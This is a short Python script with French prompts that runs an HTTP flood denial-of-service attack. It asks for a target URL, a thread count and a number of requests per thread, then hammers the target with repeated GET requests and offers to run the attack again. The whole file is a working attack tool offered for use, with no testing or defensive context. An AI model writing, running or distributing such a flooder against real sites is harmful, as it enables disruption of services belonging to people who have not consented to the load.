import os
import threading
import requests
import colorama

colorama.init()

def dos(target, count):
    for i in range(count):
        try:
            res = requests.get(target)
            print(colorama.Fore.GREEN + f"[+] Request {i+1} sent!" + colorama.Style.RESET_ALL)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[!] Connection error!" + colorama.Style.RESET_ALL)

def run_attack():
    os.system("title DOS URL")

    url = input("Enter URL (doit commencer par http:// ou https://) >> ").strip()
    if not url.startswith("http"):
        print(colorama.Fore.RED + "URL doit commencer par 'http' ou 'https' !" + colorama.Style.RESET_ALL)
        return False

    try:
        threads = int(input("Nombre de threads >> ").strip())
        if threads <= 0:
            raise ValueError
    except ValueError:
        print(colorama.Fore.RED + "Le nombre de threads doit être un entier positif !" + colorama.Style.RESET_ALL)
        return False

    try:
        req_per_thread = int(input("Nombre de requêtes par thread >> ").strip())
        if req_per_thread <= 0:
            raise ValueError
    except ValueError:
        print(colorama.Fore.RED + "Le nombre de requêtes doit être un entier positif !" + colorama.Style.RESET_ALL)
        return False

    print(colorama.Fore.CYAN + f"\nDémarrage de {threads} threads, chacun envoie {req_per_thread} requêtes..." + colorama.Style.RESET_ALL)

    thread_list = []
    for i in range(threads):
        thr = threading.Thread(target=dos, args=(url, req_per_thread))
        thr.start()
        thread_list.append(thr)
        print(colorama.Fore.YELLOW + f"[+] Thread {i+1} démarré !" + colorama.Style.RESET_ALL)

    for thr in thread_list:
        thr.join()

    print(colorama.Fore.GREEN + "\nTous les threads ont terminé !" + colorama.Style.RESET_ALL)
    return True

def main():
    while True:
        success = run_attack()
        if not success:
            print(colorama.Fore.RED + "Erreur lors de la saisie. Veuillez recommencer.\n" + colorama.Style.RESET_ALL)
            continue
        retry = input("\nVoulez-vous refaire une attaque ? (o/n) : ").strip().lower()
        if retry != 'o':
            print("Fin du programme.")
            break

if __name__ == "__main__":
    main()
